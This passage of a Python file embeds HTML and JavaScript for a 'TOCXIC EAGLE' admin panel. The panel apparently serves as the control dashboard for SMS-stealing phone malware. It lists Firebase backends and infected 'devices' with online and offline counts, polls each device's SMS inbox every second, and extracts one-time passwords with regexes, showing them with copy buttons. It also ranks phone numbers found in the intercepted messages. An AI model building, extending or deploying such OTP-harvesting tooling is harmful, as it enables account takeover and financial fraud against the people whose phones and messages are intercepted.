const statusEl = document.getElementById('inbox-status');
const statusTxt = document.getElementById('inbox-status-text');
if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
await loadInbox(false);
if(refreshTimer) clearInterval(refreshTimer);
refreshTimer = setInterval(()=>loadInbox(false), 1000); }

function findTop(msgs){ const counter = {}, senders = new Set();
msgs.forEach(m => { for(const n of (m.from||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []) senders.add(n); });
msgs.forEach(m => { for(const n of (m.message||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []){
if(senders.has(n)) continue; if(n.startsWith('1800')||n.startsWith('1900')||n.startsWith('1991')) continue;
counter[n] = (counter[n]||0) + 1; } });
let top = null, cnt = 0;
for(const [n, c] of Object.entries(counter)) if(c > cnt){ top = n; cnt = c; }
return top ? {number: top, count: cnt} : null; }

function updateTopBadge(msgs){
const b = document.getElementById('top-number-badge');
const t = findTop(msgs);
if(t && t.count >= 2){
document.getElementById('tn-num').textContent = '📞 ' + t.number;
document.getElementById('tn-count-badge').textContent = t.count + ' bar';
b.classList.remove('hidden'); } else b.classList.add('hidden'); }

async function loadInbox(showLoader){
if(!currentNum) return;
if(showLoader) document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>';
const c = new AbortController(); const tid = setTimeout(()=>c.abort(), 15000);
try{ const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) +
'&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number),
{ signal: c.signal }); clearTimeout(tid);
const d = await r.json();
if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ ' + (d.error||'Error') + '</div>'; return; }
const msgs = d.messages || []; allInboxMsgs = msgs;
if(msgs.length > 0){ const newest = msgs[0];
const otp = newest.otp || extractOtp(newest.message);
const sig = (newest.timestamp||0) + '|' + otp + '|' + (newest.message||'').slice(0,40);
if(otp && sig !== lastOtpSeen){ lastOtpSeen = sig; showOtpNotif(otp, newest.from||'Unknown', newest.message||''); } }
const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(); }
}catch(e){ clearTimeout(tid); } }

function timeAgo(ts, now){
if(!ts) return ''; const d = now - ts;
if(d < 10) return 'अभी'; if(d < 60) return d + 's';
if(d < 3600) return Math.floor(d/60) + 'm'; if(d < 86400) return Math.floor(d/3600) + 'h';
return Math.floor(d/86400) + 'd'; }

function highlightPhones(t){ return t.replace(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g, '<span class="phone-highlight">$1</span>'); }

function renderMessages(){
const box = document.getElementById('sms-container');
const now = Math.floor(Date.now()/1000);
let msgs = allInboxMsgs;
if(currentFilter === '10m') msgs = msgs.filter(m => (m.timestamp||0) >= now - 600);
else if(currentFilter === 'recent') msgs = msgs.filter(m => (m.timestamp||0) >= now - 86400);
msgs = [...msgs].sort((a,b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 60);
updateTopBadge(msgs);
if(!msgs.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
const otp = m.otp || extractOtp(m.message);
let body = otp ? escapeHtml(m.message).replace(otp, '<span class="otp-highlight">' + otp + '</span>') : escapeHtml(m.message);
body = highlightPhones(body);
const copyBtn = otp ? '<button class="otp-copy-btn" onclick="copyOtp(\\'' + otp + '\\')">📋 Copy OTP ' + otp + '</button>' : '';
const ts = m.timestamp || 0; const isFresh = ts >= now - 120;
const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
const timeStr = m.date_string || fmtTime(ts);
const newB = isFresh ? '<span class="new-badge">NEW</span>' : '';
let typeB = '';
if(otp) typeB = '<span class="msg-type-badge otp">OTP</span>';
else if(/[6-9]\\d{9}/.test(m.message||'')) typeB = '<span class="msg-type-badge number">📞 NUM</span>';
return '<div class="sms-item ' + cls + '">' + typeB +
'<div class="sms-head"><div class="sender">' + escapeHtml(m.from||'Unknown') + ' ' + newB + '</div>' +
'<div style="text-align:right"><div class="sms-time ' + (isFresh?'fresh':'') + '">' + escapeHtml(timeStr) + '</div>' +
'<div class="time-ago ' + (isFresh?'fresh':'') + '">' + timeAgo(ts, now) + '</div></div></div>' +
'<div class="sms-body">' + body + '</div>' + copyBtn + '</div>'; }).join('') + '</div>'; }

function backToList(){
document.getElementById('inbox-view').classList.add('hidden');
document.getElementById('list-view').classList.remove('hidden');
if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
currentNum = null; }

function extractOtp(text){ if(!text) return '';
const t = String(text);
let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\\d]{0,30}(\\d{4,8})/i);
if(m) return m[1];
m = t.match(/(\\d{4,8})[^\\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
if(m) return m[1]; m = t.match(/#(\\d{4,8})/); if(m) return m[1]; return ''; }

function fmtTime(ts){ if(!ts) return '';
try{ let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
const d = new Date(t*1000);
const opts = { timeZone:'Asia/Kolkata', hour12:true, day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' };
return d.toLocaleString('en-IN', opts).replace(',', ' |'); }catch(e){ return String(ts); } }

function copyOtp(c){ const done = ()=>toast('✅ Copied: ' + c);
if(navigator.clipboard) navigator.clipboard.writeText(c).then(done).catch(()=>{
const ta = document.createElement('textarea'); ta.value = c; document.body.appendChild(ta);
ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }

function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

checkConn(); loadNumbers();
setInterval(checkConn, 8000);
setInterval(()=>{ if(!currentNum) loadNumbers(); }, 5000);
</script>
</body></html>"""


# ============================================================
# SECURITY PAGE
# ============================================================
SECURITY_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Security — TOCXIC EAGLE</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
""" + ORBITRON + """
<style>""" + MOBILE_CSS + BRAND_CSS + """
.card-sec{background:var(--card);border-radius:18px;padding:20px;margin-bottom:14px;
border:1px solid var(--sep)}
.card-sec h3{font-size:14px;color:#344054;margin-bottom:6px;font-weight:800;
font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase}
.card-sec p.desc{font-size:12px;color:var(--muted);margin-bottom:16px}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;color:var(--muted);font-weight:700;margin-bottom:6px}
.pwd-wrap{position:relative}
.pwd-wrap input{width:100%;padding:14px 48px 14px 14px;border-radius:12px;
border:1.5px solid var(--sep);background:#f9fafb;outline:none;color:var(--text);transition:.2s}
.pwd-wrap input:focus{border-color:#0F3CC9;background:#fff;
box-shadow:0 0 0 4px rgba(15,60,201,.12)}
.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);
cursor:pointer;font-size:18px;color:var(--muted2);padding:4px}
.btn{padding:14px 20px;border:none;border-radius:12px;font-weight:800;font-size:13px;
width:100%;min-height:50px;font-family:inherit}
.btn.warning{background:linear-gradient(135deg,#E40000,#FF4D4D);color:#fff}
.msg{margin-top:12px;padding:12px 14px;border-radius:12px;font-size:13px;
display:none;text-align:center;font-weight:700}
.msg.ok{background:rgba(18,183,106,.15);color:#05603a;display:block}
.msg.err{background:rgba(240,68,56,.12);color:#b42318;display:block}
</style></head><body>

<div class="topbar">
<div class="brand"><span class="eagle">🦅</span>
<div><span class="name">TOCXIC EAGLE</span><span class="sub">SECURITY</span></div></div>
<div class="nav">
<a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
<a href="/firebases" class="nav-link">🔥 Firebases</a>
<a href="/admin/security" class="nav-link sec active">🔒 Security</a>
</div>
<a href="/logout" class="nav-link">Logout</a>
</div>

<div class="container">
<div class="card-sec">
<h3>👑 Change Admin Password</h3>
<p class="desc">Ye password admin panel login ke liye. MongoDB me permanent save hoga.</p>
<div class="field">
<label>New Admin Password</label>
<div class="pwd-wrap">
<input type="password" id="admin-pwd" placeholder="Enter new admin password">
<span class="toggle-pwd" onclick="togglePwd('admin-pwd', event)">👁️</span>
</div>
</div>
<button class="btn warning" onclick="changeAdminPwd()">Update Admin Password</button>
<div class="msg" id="admin-msg"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2500); }
function togglePwd(id, e){ const i = document.getElementById(id); const t = e.target;
if(i.type === 'password'){ i.type = 'text'; t.textContent = '🙈'; }
else { i.type = 'password'; t.textContent = '👁️'; } }
function showMsg(id, t, type){ const e = document.getElementById(id);
e.className = 'msg ' + type; e.textContent = t;
if(type === 'ok') setTimeout(()=>{ e.className = 'msg'; }, 3000); }
async function changeAdminPwd(){
const pwd = document.getElementById('admin-pwd').value.trim();
if(!pwd || pwd.length < 4){ showMsg('admin-msg', '❌ Min 4 chars', 'err'); return; }
const r = await fetch('/api/security/change', { method:'POST',
headers:{'Content-Type':'application/json'}, body: JSON.stringify({role:'admin', password: pwd}) });
const d = await r.json();
if(d.success){ showMsg('admin-msg', '✅ Admin password saved!', 'ok');
document.getElementById('admin-pwd').value = ''; toast('✅ Changed'); }
else showMsg('admin-msg', '❌ ' + (d.error||'Error'), 'err'); }
</script>
</body></html>"""


# ============================================================
# FIREBASES PAGE
# ============================================================
FIREBASES_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Firebases — TOCXIC EAGLE</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
""" + ORBITRON + """
<style>""" + MOBILE_CSS + BRAND_CSS + """
.card-fb{background:var(--card);border-radius:18px;padding:18px;margin-bottom:14px;
border:1px solid var(--sep)}
.card-fb h3{font-size:13px;color:#344054;margin-bottom:14px;font-weight:800;
font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase;
display:flex;align-items:center;gap:8px}
.add-row{display:flex;gap:8px;flex-wrap:wrap}
.add-row input{flex:1;min-width:200px;padding:14px 16px;border-radius:12px;
border:1px solid var(--sep);background:#f9fafb;font-size:14px;outline:none;color:var(--text)}
.add-row input:focus{border-color:#0F3CC9;box-shadow:0 0 0 4px rgba(15,60,201,.12);background:#fff}
.card-fb button{padding:14px 22px;border:none;border-radius:12px;font-weight:800;
font-size:12px;font-family:inherit;min-height:50px}
.card-fb button.primary{background:var(--grad-b);color:#fff}
.card-fb button.gray{background:rgba(16,24,40,.08);color:#344054}
.card-fb button.danger{background:rgba(240,68,56,.1);color:#b42318}
.card-fb button.danger-solid{background:var(--grad-r);color:#fff}
.card-fb button.green{background:linear-gradient(135deg,#12b76a,#32d583);color:#fff}
.bulk-area{margin-top:12px;display:none}
.bulk-area textarea{width:100%;padding:14px;border-radius:12px;border:1px solid var(--sep);
background:#f9fafb;font-size:13px;min-height:140px;font-family:monospace;outline:none;
color:var(--text);resize:vertical}
.bulk-area textarea:focus{border-color:#0F3CC9;background:#fff}
.bulk-area button{margin-top:10px}
.msg-fb{margin-top:12px;padding:12px 16px;border-radius:12px;font-size:13px;
display:none;font-weight:700}
.msg-fb.ok{background:rgba(18,183,106,.15);color:#05603a;display:block}
.msg-fb.err{background:rgba(240,68,56,.12);color:#b42318;display:block}
.fb-header{display:flex;justify-content:space-between;align-items:center;
margin-bottom:14px;flex-wrap:wrap;gap:10px}
.fb-header h2{font-size:14px;font-weight:800;color:#344054;
font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase;
display:flex;align-items:center;gap:8px}
.fb-header .cnt{background:rgba(16,24,40,.08);color:#344054;padding:4px 12px;
border-radius:20px;font-size:11px;font-family:'Orbitron',sans-serif;font-weight:800}
.fb-header .actions{display:flex;gap:8px;flex-wrap:wrap}
.fb-header .actions button{padding:10px 14px;font-size:12px}
.fb-list{display:grid;gap:10px}
.fb-card{background:var(--card);border-radius:16px;padding:16px;display:flex;
align-items:center;gap:14px;border:1px solid var(--sep);flex-wrap:wrap}
.fb-icon{width:48px;height:48px;border-radius:14px;
background:linear-gradient(135deg,#fef3c7,#fde68a);display:flex;align-items:center;
justify-content:center;font-size:22px;flex-shrink:0}
.fb-info{flex:1;min-width:0;cursor:pointer}
.fb-name{font-size:14px;font-weight:800;color:var(--text);overflow:hidden;
text-overflow:ellipsis;white-space:nowrap;font-family:'Orbitron',sans-serif;
display:flex;align-items:center;gap:6px;flex-wrap:wrap}
.fb-hash{font-size:11px;color:var(--muted2);margin-top:4px;font-family:monospace;word-break:break-all}
.fb-counts{display:flex;gap:6px;margin-top:6px;flex-wrap:wrap}
.fb-count-pill{display:inline-flex;align-items:center;gap:4px;font-size:10px;
font-weight:800;padding:3px 8px;border-radius:8px}
.fb-count-pill.online{background:rgba(18,183,106,.15);color:#05603a}
.fb-count-pill.offline{background:rgba(240,68,56,.12);color:#b42318}
.fb-count-pill.devices{background:rgba(15,60,201,.1);color:#0F3CC9}
.fb-count-pill .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
.fb-actions{display:flex;gap:6px;flex-shrink:0}
.fb-actions button{padding:10px 12px;font-size:12px}
.checkbox{width:24px;height:24px;border:2px solid rgba(16,24,40,.2);border-radius:8px;
display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;
background:#fff;color:#fff;font-size:14px;font-weight:800}
.checkbox.checked{background:var(--grad-b);border-color:transparent}
.select-all{display:flex;align-items:center;gap:12px;padding:14px 16px;
background:rgba(16,24,40,.05);border-radius:12px;margin-bottom:12px;font-size:13px;
font-weight:800;color:#344054;cursor:pointer}
.empty{text-align:center;padding:60px 20px;color:var(--muted);font-size:14px;
background:var(--card);border-radius:18px;border:1px solid var(--sep)}
.loading-text{text-align:center;padding:28px;color:var(--muted);font-size:13px;
background:var(--card);border-radius:18px;margin-bottom:16px;border:1px solid var(--sep)}
</style></head><body>

<div class="topbar">
<div class="brand"><span class="eagle">🦅</span>
<div><span class="name">TOCXIC EAGLE</span><span class="sub">FIREBASES</span></div></div>
<div class="nav">
<a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
<a href="/firebases" class="nav-link active">🔥 Firebases</a>
<a href="/admin/security" class="nav-link sec">🔒 Security</a>
</div>
<div class="conn" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
</div>

<div class="container">
<div class="card-fb">
<h3>➕ Add Firebase URL</h3>
<div class="add-row">
<input id="fb-url" placeholder="https://xxx.firebaseio.com"
onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
<button class="primary" onclick="addFirebase()">Add</button>
<button class="gray" onclick="toggleBulk()">Bulk</button>
</div>
<div id="bulk-area" class="bulk-area">
<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
<button class="green" onclick="bulkAdd()">📥 Import All</button>
</div>
<div id="fb-msg" class="msg-fb"></div>
</div>

<div class="card-fb">
<div class="fb-header">
<h2>🔥 Firebases <span class="cnt" id="fb-count">0</span></h2>
<div class="actions">
<button class="danger" onclick="removeSelected()">🗑 Sel</button>
<button class="danger-solid" onclick="removeAll()">🗑 All</button>
</div>
</div>
<div class="select-all" onclick="toggleSelectAll()">
<div class="checkbox" id="select-all-cb"></div><span>Select All</span>
</div>
<div id="loading-text" class="loading-text"><span class="spinner"></span>Loading...</div>
<div id="fb-list" class="fb-list"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
let firebases = [], selected = new Set();

function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2200); }

async function checkConn(){
try{ const r = await fetch('/api/conn'); const d = await r.json();
const b = document.getElementById('conn-badge'), t = document.getElementById('conn-text');
if(d.mongo_connected){ b.className = 'conn online'; t.textContent = 'Live'; }
else { b.className = 'conn offline'; t.textContent = 'Off'; } }catch(e){} }

function toggleBulk(){ const a = document.getElementById('bulk-area');
a.style.display = (a.style.display === 'block') ? 'none' : 'block'; }

async function addFirebase(){
const url = document.getElementById('fb-url').value.trim();
if(!url) return showMsg('URL required','err');
try{ const r = await fetch('/api/firebases', { method:'POST',
headers:{'Content-Type':'application/json'}, body: JSON.stringify({url}) });
const d = await r.json();
if(d.success){ showMsg('✅ Added','ok');
document.getElementById('fb-url').value = ''; loadFirebases(); }
else showMsg('❌ ' + (d.error||'Error'),'err'); }
catch(e){ showMsg('❌ Network error','err'); } }

async function bulkAdd(){
const txt = document.getElementById('fb-bulk').value.trim();
if(!txt) return showMsg('Empty','err');
const urls = txt.split('\\n').map(l => l.trim()).filter(l => l.startsWith('http'));
if(!urls.length) return showMsg('No valid URLs','err');
showMsg('⏳ Adding ' + urls.length + '...','ok');
try{ const r = await fetch('/api/firebases/bulk', { method:'POST',
headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls}) });
const d = await r.json();
if(d.success){ showMsg('✅ Added: ' + d.added + ', Skip: ' + d.skipped,'ok');
document.getElementById('fb-bulk').value = '';
document.getElementById('bulk-area').style.display = 'none'; loadFirebases(); }
else showMsg('❌ ' + (d.error||'Error'),'err'); }
catch(e){ showMsg('❌ Network error','err'); } }

function showMsg(t, type){ const e = document.getElementById('fb-msg');
e.className = 'msg-fb ' + type; e.textContent = t;
if(type === 'ok') setTimeout(()=>{ e.className = 'msg-fb'; }, 3000); }

async function loadFirebases(){
document.getElementById('loading-text').style.display = 'block';
try{ const r = await fetch('/api/firebases'); const d = await r.json();
if(!d.success){ document.getElementById('loading-text').textContent = '❌ ' + (d.error||'Error'); return; }
firebases = d.firebases || [];
document.getElementById('fb-count').textContent = firebases.length;
document.getElementById('loading-text').style.display = 'none';
renderFbs(); updateSelectAll(); }
catch(e){ document.getElementById('loading-text').textContent = '❌ Network error'; } }

function renderFbs(){
const box = document.getElementById('fb-list');
if(firebases.length === 0){ box.innerHTML = '<div class="empty">🦅 No firebase yet</div>'; return; }
box.innerHTML = firebases.map(f => {
const isSel = selected.has(f.id);
const badge = f.source === 'personal_otp'
? '<span style="background:rgba(18,183,106,.15);color:#065f46;font-size:9px;padding:2px 6px;border-radius:6px;font-weight:800">👤 USER</span>'
: '<span style="background:rgba(15,60,201,.1);color:#0F3CC9;font-size:9px;padding:2px 6px;border-radius:6px;font-weight:800">👑 ADMIN</span>';
const stats = f.stats || {online: 0, offline: 0, devices: 0};
return '<div class="fb-card">' +
'<div class="checkbox ' + (isSel?'checked':'') + '" onclick="event.stopPropagation();toggleSelect(\\'' + f.id + '\\')">' + (isSel?'✓':'') + '</div>' +
'<div class="fb-icon">🔥</div>' +
'<div class="fb-info" onclick="openFb(\\'' + f.id + '\\')">' +
'<div class="fb-name">' + escapeHtml(f.name||'unnamed') + badge + '</div>' +
'<div class="fb-hash">🔒 ID: ' + escapeHtml(f.hash||'hidden') + '</div>' +
'<div class="fb-counts">' +
'<span class="fb-count-pill online"><span class="dot"></span>' + stats.online + ' Online</span>' +
'<span class="fb-count-pill offline"><span class="dot"></span>' + stats.offline + ' Offline</span>' +
'<span class="fb-count-pill devices">📱 ' + stats.devices + ' Devices</span>' +
'</div></div>' +
'<div class="fb-actions">' +
'<button class="primary" onclick="event.stopPropagation();openFb(\\'' + f.id + '\\')">Open</button>' +
'<button class="danger" onclick="event.stopPropagation();removeOne(\\'' + f.id + '\\')">🗑</button>' +
'</div></div>'; }).join(''); }

function openFb(id){ window.location.href = '/firebase/' + id; }
function toggleSelect(id){ if(selected.has(id)) selected.delete(id); else selected.add(id);
renderFbs(); updateSelectAll(); }
function toggleSelectAll(){ if(selected.size === firebases.length) selected.clear();
else selected = new Set(firebases.map(f => f.id));
renderFbs(); updateSelectAll(); }
function updateSelectAll(){ const cb = document.getElementById('select-all-cb');
if(firebases.length > 0 && selected.size === firebases.length){
cb.classList.add('checked'); cb.textContent = '✓'; }
else { cb.classList.remove('checked'); cb.textContent = ''; } }

async function removeOne(id){
if(!confirm('Delete this firebase?')) return;
const r = await fetch('/api/firebases/' + id, { method:'DELETE' }); const d = await r.json();
if(d.success){ toast('✅ Deleted'); selected.delete(id); loadFirebases(); }
else toast('❌ ' + (d.error||'Error')); }

async function removeSelected(){
if(selected.size === 0) return toast('❌ Select at least one');
if(!confirm('Delete ' + selected.size + ' firebase(s)?')) return;
const ids = Array.from(selected);
const r = await fetch('/api/firebases/bulk-delete', { method:'POST',
headers:{'Content-Type':'application/json'}, body: JSON.stringify({ids}) });
const d = await r.json();
if(d.success){ toast('✅ Deleted: ' + d.deleted); selected.clear(); loadFirebases(); }
else toast('❌ ' + (d.error||'Error')); }

async function removeAll(){
if(firebases.length === 0) return toast('❌ No firebases');
if(!confirm('Delete ALL ' + firebases.length + '?')) return;
const r = await fetch('/api/firebases/all', { method:'DELETE' }); const d = await r.json();
if(d.success){ toast('✅ Deleted all: ' + d.deleted); selected.clear(); loadFirebases(); }
else toast('❌ ' + (d.error||'Error')); }

function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

checkConn(); loadFirebases();
setInterval(checkConn, 10000);
setInterval(loadFirebases, 20000);
</script>
</body></html>"""


# ============================================================
# FIREBASE VIEW PAGE
# ============================================================
FIREBASE_VIEW_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Firebase — TOCXIC EAGLE</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
""" + ORBITRON + """
<style>""" + MOBILE_CSS + BRAND_CSS + """
.hero{background:var(--card);border-radius:18px;padding:18px;margin-bottom:14px;border:1px solid var(--sep)}
.hero h1{font-size:16px;font-weight:800;color:var(--text);margin-bottom:6px;
display:flex;align-items:center;gap:8px;flex-wrap:wrap;font-family:'Orbitron',sans-serif}
.hero .hash{font-size:11px;color:var(--muted2);font-family:monospace;margin-bottom:14px}
.hero-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:8px}
.hs{background:#f8fafc;border-radius:12px;padding:12px;text-align:center}
.hs b{display:block;font-size:22px;font-weight:800;color:#0F3CC9;margin-bottom:2px;
font-family:'Orbitron',sans-serif}
.hs span{font-size:10px;color:var(--muted2);text-transform:uppercase;font-weight:800;
letter-spacing:.5px;font-family:'Orbitron',sans-serif}
.hs.online b{color:#12b76a}
.hs.offline b{color:#E40000}
.hs.otp b{color:#7c3aed}
</style></head><body>

<div class="topbar">
<div class="brand"><span class="eagle">🦅</span>
<div><span class="name">TOCXIC EAGLE</span><span class="sub">FIREBASE</span></div></div>
<div class="nav">
<a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
<a href="/firebases" class="nav-link active">🔥 Firebases</a>
<a href="/admin/security" class="nav-link sec">🔒</a>
</div>
<a href="/logout" class="nav-link">Logout</a>
</div>

<div class="container">
<div class="hero">
<h1>🔥 <span id="fb-name">Loading...</span></h1>
<div class="hash">🔒 ID: <span id="fb-hash">hidden</span></div>
<div class="hero-stats">
<div class="hs"><b id="h-dev">0</b><span>Devices</span></div>
<div class="hs online"><b id="h-on">0</b><span>Online</span></div>
<div class="hs offline"><b id="h-off">0</b><span>Offline</span></div>
<div class="hs otp"><b id="h-otp">0</b><span>OTPs</span></div>
</div>
</div>

<div id="list-view">
<div class="loading-text" id="loading-text"><span class="spinner"></span>Loading...</div>
<div id="list-content" class="hidden">
<div class="search-box"><input id="search-num" placeholder="🔎 Search" oninput="renderNumbers()"></div>
<div class="list-header"><h2>📱 Numbers</h2><span class="count" id="num-count">0</span></div>
<div id="num-list"></div>
</div>
</div>

<div id="inbox-view" class="hidden">
<div class="inbox-header">
<div class="inbox-top">
<a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a>
<div style="flex:1">
<div class="inbox-num" id="inbox-num">+91 ------</div>
<div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div>
</div>
</div>
<div class="inbox-meta">
<span>⚡ auto 1s · Latest 60 SMS</span>
<span class="refresh-icon" onclick="loadInbox(true)">🔄</span>
</div>
</div>
<div id="top-number-badge" class="top-number-badge hidden">
<div class="tn-icon">🏆</div>
<div class="tn-info">
<div class="tn-num" id="tn-num">-</div>
<div class="tn-count">Sabse zyada baar <span class="tn-highlight" id="tn-count-badge">0</span></div>
</div>
</div>
<div id="sms-container"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
const FB_ID = "{{FB_ID}}";
let numbers = [], currentNum = null, refreshTimer = null, lastInboxSig = '';

function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 1800); }

async function loadFirebase(){
try{ const r = await fetch('/api/firebase/' + FB_ID); const d = await r.json();
if(!d.success){ document.getElementById('loading-text').innerHTML = '❌ '+(d.error||'Error'); return; }
document.getElementById('fb-name').textContent = d.name || 'unnamed';
document.getElementById('fb-hash').textContent = d.hash || 'hidden';
document.getElementById('h-dev').textContent = d.device_count;
document.getElementById('h-on').textContent = d.online_count;
document.getElementById('h-off').textContent = d.offline_count || 0;
document.getElementById('h-otp').textContent = d.otp_count;
numbers = d.numbers || [];
document.getElementById('num-count').textContent = numbers.length;
document.getElementById('loading-text').classList.add('hidden');
document.getElementById('list-content').classList.remove('hidden');
renderNumbers();
}catch(e){ document.getElementById('loading-text').innerHTML = '❌ Network error'; } }

function renderNumbers(){
const q = (document.getElementById('search-num').value || '').toLowerCase();
const box = document.getElementById('num-list');
const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 No numbers</div>'; return; }
box.innerHTML = filtered.map(n => {
const isOn = n.online === true;
const isUnk = (n.number || '').startsWith('UNKNOWN-');
const iconCls = isUnk ? 'gray' : (isOn ? '' : 'red');
const badgeCls = isOn ? 'badge-online' : 'badge-offline';
const badgeTxt = isOn ? 'Online' : 'Offline';
const titleCls = isUnk ? 'unknown' : '';
const idx = numbers.indexOf(n);
return '<div class="num-card">' +
'<div class="num-icon ' + iconCls + '" onclick="openInboxAt(' + idx + ')">' + (isUnk ? '❓' : '📶') + '</div>' +
'<div class="num-info" onclick="openInboxAt(' + idx + ')">' +
'<div class="num-title ' + titleCls + '">' + escapeHtml(n.number) + '</div>' +
'<div class="num-sub"><span class="pill">📨 ' + n.msg_count + ' SMS</span>' +
(n.otp_count > 0 ? '<span class="pill otp">🔑 ' + n.otp_count + ' OTP</span>' : '') + '</div></div>' +
'<div class="card-actions"><button class="raw-btn" onclick="event.stopPropagation();openRawData(' + idx + ')" title="Raw Data">🔍</button></div>' +
'<div class="' + badgeCls + '" onclick="openInboxAt(' + idx + ')"><span class="dot"></span>' + badgeTxt + '</div>' +
'<div class="arrow">›</div></div>'; }).join(''); }

function openRawData(idx){ if(idx < 0 || idx >= numbers.length) return;
const n = numbers[idx];
const url = '/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
window.open(url, '_blank'); }

function openInboxAt(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }

async function openInbox(n){
currentNum = n; lastInboxSig = '';
document.getElementById('list-view').classList.add('hidden');
document.getElementById('inbox-view').classList.remove('hidden');
document.getElementById('inbox-num').textContent = n.number;
const statusEl = document.getElementById('inbox-status'); const statusTxt = document.getElementById('inbox-status-text');
if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
await loadInbox(false);
if(refreshTimer) clearInterval(refreshTimer);
refreshTimer = setInterval(()=>loadInbox(false), 1000); }

function findTop(msgs){ const counter = {}, senders = new Set();
msgs.forEach(m => { for(const n of (m.from||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []) senders.add(n); });
msgs.forEach(m => { for(const n of (m.message||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []){
if(senders.has(n)) continue; if(n.startsWith('1800')||n.startsWith('1900')||n.startsWith('1991')) continue;
counter[n] = (counter[n]||0) + 1; } });
let top = null, cnt = 0;
for(const [n, c] of Object.entries(counter)) if(c > cnt){ top = n; cnt = c; }
return top ? {number: top, count: cnt} : null; }

function updateTopBadge(msgs){
const b = document.getElementById('top-number-badge');
const t = findTop(msgs);
if(t && t.count >= 2){
document.getElementById('tn-num').textContent = '📞 ' + t.number;
document.getElementById('tn-count-badge').textContent = t.count + ' bar';
b.classList.remove('hidden'); } else b.classList.add('hidden'); }

async function loadInbox(showLoader){
if(!currentNum) return;
if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>'; }
const c = new AbortController(); const tid = setTimeout(() => c.abort(), 15000);
try{
const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number), { signal: c.signal });
clearTimeout(tid); const d = await r.json();
if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ '+(d.error||'Error')+'</div>'; return; }
const msgs = d.messages || [];
